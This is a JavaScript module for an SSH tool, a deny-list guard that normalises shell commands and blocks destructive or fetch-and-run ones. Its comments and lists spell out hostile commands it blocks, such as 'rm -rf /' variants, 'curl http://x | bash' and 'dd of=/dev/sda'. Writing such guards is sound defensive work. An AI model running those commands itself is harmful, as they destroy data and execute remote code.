// SPDX-License-Identifier: MIT
// Copyright (c) 2026 ljk00000
//
// Part of dsh-ssh-safe. See LICENSE.
// dsh-ssh-safe — command guard.
//
// This is a safety rail against catastrophic typos, NOT a security boundary.
// A shell is Turing-complete; anything committed to running arbitrary commands
// can be reached eventually. What this module does is close the *accidental*
// and the *lazy* paths, which is where real damage comes from:
//
//   rm -rf /        rm -fr /      rm --recursive --force /
//   bash -c 'rm -rf /'            eval 'rm -rf /'
//   R=rm; $R -rf /                /bin/rm -rf /
//
// The approach is to normalise before matching rather than to enumerate
// spellings: collapse whitespace, drop quotes, strip a leading path, and treat
// a shell wrapper (sh -c, bash -c, eval) as a call to inspect its argument.

/**
 * Interpreters that turn piped bytes into execution.
 *
 * `curl http://x | bash` is the commonest remote-code-execution shape and it
 * matched no pattern: the string contains no forbidden command, only a pipe
 * into an interpreter.
 */
/**
 * Prefixes that may stand in front of the interpreter on the right of a pipe.
 * They change how the command runs, not what it runs.
 */
const PIPE_PREFIXES = new Set(['sudo', 'env', 'command', 'nohup', 'time', 'stdbuf', 'exec'])

/** Interpreters: piping into one of these executes whatever arrived. */
const PIPE_EXECUTORS = new Set([
  'bash', 'sh', 'zsh', 'dash', 'ksh', 'python', 'python3', 'perl', 'ruby',
  'node', 'eval', 'source',
])

/**
 * Writers: piping into one of these is only dangerous with elevated rights,
 * because 'echo hi | tee out.txt' is ordinary work.
 */
const PIPE_PRIVILEGED_WRITERS = new Set([
  'tee', 'dd', 'install', 'chown', 'chmod', 'mv', 'cp',
])

/** Words that wrap another command and should be looked into. */
const SHELL_WRAPPERS = ['bash', 'sh', 'zsh', 'dash', 'ksh', 'eval', 'exec', 'env', 'command', 'builtin', 'sudo', 'doas']

/**
 * Normalise a command so that cosmetic differences stop mattering.
 * @param {string} command
 * @returns {string}
 */
export function normalizeCommand(command) {
  let s = String(command ?? '')
  s = s.replace(/\s+/g, ' ').trim()
  s = s.replace(/['"]/g, '')
  s = s.replace(/^(\/(?:[\w.+-]+\/)*)([\w.+-]+)/, '$2')
  s = s.replace(/\\([\w.+-])/g, '$1')
  return s
}

/**
 * Collapse rm's separated short flags and expand long ones.
 * rm -fr /  ->  rm -rf / ;  rm --recursive --force /  ->  rm -rf /
 */
export function canonicalizeRm(text) {
  const re = /(?:^|[\s;&|()])(?:[\w./-]*\/)?rm\s+([^;|&\n]*)/g
  return String(text).replace(re, (_m, rawArgs) => {
    const args = String(rawArgs)

    // Collect the flags that matter, in one place.
    const recursive = /(?:^|\s)(?:--recursive|-r|-R)(?=\s|$)/.test(args) || /-[a-zA-Z]*[rR]/.test(args)
    const force = /(?:^|\s)--force(?=\s|$)/.test(args) || /-[a-zA-Z]*f/.test(args)

    // The target list is everything that is not a flag. Long options are kept
    // as words rather than deleted: the previous version stripped every
    // '-[a-zA-Z]+' token, so '--no-preserve-root' vanished and left 'rm -rf -',
    // which no longer matched the pattern for 'rm -rf /'.
    let rest = args
    // Known long options become their short form.
    rest = rest.replace(/--recursive(?=\s|$)/g, ' ')
    rest = rest.replace(/--force(?=\s|$)/g, ' ')
    rest = rest.replace(/--preserve-root(?=\s|$)/g, ' ')
    rest = rest.replace(/--no-preserve-root(?=\s|$)/g, ' ')
    rest = rest.replace(/--verbose(?=\s|$)/g, ' ')
    rest = rest.replace(/--dir(?=\s|$)/g, ' ')
    // Any other long option is kept as a plain word.
    rest = rest.replace(/--[a-z][a-z-]*/g, (m) => ' ' + m.replace(/^--/, '') + ' ')
    // Short option clusters are removed from the argument list; the collected
    // letters are emitted once, in canonical order.
    rest = rest.replace(/-[a-zA-Z]+/g, '')

    const targets = rest.replace(/\s+/g, ' ').trim()
    const flags = (recursive ? 'r' : '') + (force ? 'f' : '')
    // A trailing space keeps the canonical form self-delimiting. Without it,
    // 'rm -rf /;' produced " rm -rf /;" and the pattern for 'rm -rf /' -- which
    // requires whitespace, end-of-string or '*' after the slash -- did not
    // match, so a semicolon was enough to slip past the rail.
    return ' rm -' + flags + ' ' + targets + ' '
  })
}

function findWrapper(text) {
  const first = String(text).split(/\s+/)[0] || ''
  const bare = first.replace(/^[\w./-]*\//, '')
  return SHELL_WRAPPERS.includes(bare) ? bare : null
}

/**
 * Best-effort extraction of the command a wrapper runs.
 * @returns {string|null}
 */
function extractWrapped(text, wrapper) {
  const idx = String(text).indexOf(wrapper)
  if (idx < 0) return null
  const rest = String(text).slice(idx + wrapper.length).trim()
  if (!rest) return null
  const kept = []
  for (const token of rest.split(/\s+/)) {
    if (/^-[a-zA-Z]+$/.test(token)) continue
    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(token)) continue
    kept.push(token)
  }
  const inner = kept.join(' ').trim()
  return inner.length > 0 ? inner : null
}

/**
 * Decide whether a command should be refused.
 * @param {string} command
 * @param {string[]} patterns regular expressions from the plugin config
 * @returns {{blocked: boolean, reason?: string, pattern?: string}}
 */
/**
 * Detect a pipeline that feeds an interpreter.
 *
 * @param {string} normalized a command already passed through normalizeCommand
 * @returns {{found: boolean, executor?: string, source?: string}}
 */
export function checkPipeline(normalized) {
  const text = String(normalized ?? '')
  // Split on single pipes only: || is a boolean operator, not a pipeline.
  const segments = text.split(/(?<!\|)\|(?!\|)/)
  if (segments.length < 2) return { found: false }

  for (let i = 1; i < segments.length; i++) {
    const right = segments[i].trim()
    if (!right) continue

    // The right side of a pipe can carry the usual prefixes: 'sudo', 'env',
    // 'command', 'nohup', and variable assignments. Looking only at the first
    // word missed 'curl x |sudo bash', which is the same threat as
    // 'curl x | bash'.
    let head = right.split(/\s+/)[0]
    let elevated = false
    let guard = 0
    while (guard++ < 8) {
      const bare = head.replace(/^[\w./-]*\//, '')
      if (PIPE_PREFIXES.has(bare)) {
        // A privilege prefix makes the write on the right privileged.
        if (bare === 'sudo') elevated = true
        // A prefix may carry its own options: 'sudo -u root bash'. Skip them
        // and keep looking for the command.
        const rest = right.split(/\s+/).slice(1)
        let k = 0
        while (k < rest.length && /^(-|--)/.test(rest[k])) k++
        // 'sudo -u root bash' -- '-u' takes a value, so the word after it is
        // not the command either.
        if (rest[k - 1] === '-u' || rest[k - 1] === '--user' || rest[k - 1] === '-g' || rest[k - 1] === '--group') k++
        if (k >= rest.length) break
        head = rest[k]
        continue
      }
      break
    }
    const bare = head.replace(/^[\w./-]*\//, '')
    if (PIPE_EXECUTORS.has(bare)) {
      return { found: true, executor: bare, source: segments[i - 1].trim() }
    }
    if (elevated && PIPE_PRIVILEGED_WRITERS.has(bare)) {
      return { found: true, executor: bare, source: segments[i - 1].trim() }
    }
    // 'dd of=/dev/sda' destroys a disk. The deny list covers 'dd if=... of=/dev/*',
    // but the piped form has no 'if=', so it is caught here.
    if (bare === 'dd' && /\bof=\/dev\//.test(right)) {
      return { found: true, executor: bare, source: segments[i - 1].trim() }
    }
  }
  return { found: false }
}

/**
 * How much of a candidate each pattern is run against, from each end.
 *
 * Several of the default rules have the shape "keyword ... later-token", and a
 * pattern of that shape costs O(n) per start position, so a single enormous
 * line is quadratic. Measured on the loopback box: a 400 KB line made of
 * 'find / ' repeated took 19.5 s. Real commands are far shorter than this
 * window; the guard is a rail, and a command long enough to hide something in
 * the middle of 400 KB can also spell the same thing differently.
 */
const MAX_SCAN_CHARS = 8192

/** How deep a command may be unwrapped (sudo sudo sudo ...). */
const MAX_WRAPPER_DEPTH = 4

/** The head and tail of a candidate, bounded by MAX_SCAN_CHARS each. */
function scanWindows(text) {
  if (text.length <= MAX_SCAN_CHARS * 2) return [text]
  return [text.slice(0, MAX_SCAN_CHARS), text.slice(-MAX_SCAN_CHARS)]
}

/**
 * Commands whose quoted arguments are DATA, not code.
 *
 * `grep 'rm -rf /' notes.md` and `git commit -m "fix rm -rf /"` were refused:
 * the text inside the quotes matched, and a rail that blocks searching for a
 * dangerous string is one the user turns off. For these heads the quoted spans
 * are blanked before matching; the unquoted part of the command is still
 * checked, so `grep x && rm -rf /` is refused as before.
 *
 * Anything that can execute its argument (bash -c, eval, awk, ssh, xargs,
 * find -exec, docker, an editor, ...) keeps the old behaviour.
 */
const DATA_HEADS = new Set([
  'grep', 'egrep', 'fgrep', 'rg', 'ag', 'ack', 'echo', 'printf', 'cat', 'ls',
  'stat', 'head', 'tail', 'wc', 'diff', 'man', 'less', 'more', 'history',
  'type', 'which', 'whereis', 'alias', 'whatis', 'apropos', 'info', 'tac',
  'nl', 'cut', 'sort', 'uniq', 'file', 'du', 'df', 'git', 'journalctl',
])

/** Head word of a command, looking through prefixes like sudo/env/timeout. */
function headWord(command) {
  let rest = String(command || '').trim()
  for (let i = 0; i < 6; i++) {
    const word = rest.split(/\s+/)[0] || ''
    if (!word) return ''
    const bare = word.replace(/^[\w./-]*\//, '')
    const isPrefix = PIPE_PREFIXES.has(bare) || ['timeout', 'nice', 'setsid', 'ionice'].includes(bare)
    if (!isPrefix) return bare
    rest = rest.slice(word.length).trim()
    // Wrapper options: 'sudo -u root bash' -> 'bash'.
    rest = rest.replace(/^(?:-{1,2}\S+(?:\s+\S+)?\s+)+/, '')
  }
  return ''
}

/**
 * Blank the inside of quoted spans, keeping the quotes and everything else.
 *
 * `rm -rf "/"` is unaffected in the dangerous part (`rm -rf` and the target are
 * outside the quotes), so it is still refused; only text wholly inside quotes
 * disappears.
 *
 * @param {string} text
 * @returns {string}
 */
function blankQuoted(text) {
  let out = ''
  let quote = null
  for (const ch of String(text)) {
    if (quote) {
      if (ch === quote) { quote = null; out += ch } else out += ' '
      continue
    }
    if (ch === '"' || ch === "'") { quote = ch; out += ch; continue }
    out += ch
  }
  return out
}

export function checkCommand(command, patterns, options = {}) {
  const list = Array.isArray(patterns) ? patterns : []
  if (list.length === 0) return { blocked: false }

  let raw = String(command ?? '')
  // See DATA_HEADS: for a command that only reads text, what is inside quotes
  // is the text, not instructions.
  if (DATA_HEADS.has(headWord(normalizeCommand(raw).split(/\s+/)[0] || ''))) {
    raw = blankQuoted(raw)
  }
  const normalized = normalizeCommand(raw)
  const canonical = canonicalizeRm(normalized)

  for (const candidate of new Set([raw, normalized, canonical])) {
    for (const window of scanWindows(candidate)) {
      for (const pattern of list) {
        let re
        try { re = new RegExp(pattern) } catch { continue }
        if (re.test(window)) return { blocked: true, reason: 'matches deny pattern', pattern }
      }
    }
  }

  // A pipeline into an interpreter executes whatever the left side produced,
  // which pattern matching cannot see. Refusing it is the conservative choice;
  // set pipeToShell: 'allow' if a workflow needs it.
  const pipeline = options.allowPipeline === true ? { found: false } : checkPipeline(normalized)
  if (pipeline.found) {
    return {
      blocked: true,
      reason: 'pipes into ' + pipeline.executor,
      pattern: 'pipeline: ' + pipeline.source + ' | ' + pipeline.executor,
    }
  }

  // 'sudo sudo sudo ...' is a wrapper every time: without a depth limit each
  // level re-scanned the whole remainder, which is quadratic and also recursed
  // once per token (a 400 KB line of 'sudo ' never finished).
  const depth = Number.isInteger(options.depth) ? options.depth : 0
  const wrapper = depth < MAX_WRAPPER_DEPTH ? findWrapper(normalized) : null
  if (wrapper) {
    const inner = extractWrapped(normalized, wrapper)
    if (inner && inner !== normalized) {
      const nested = checkCommand(inner, list, { ...options, depth: depth + 1 })
      if (nested.blocked) {
        return { blocked: true, reason: 'inside ' + wrapper, pattern: nested.pattern }
      }
    }
  }

  return { blocked: false }
}
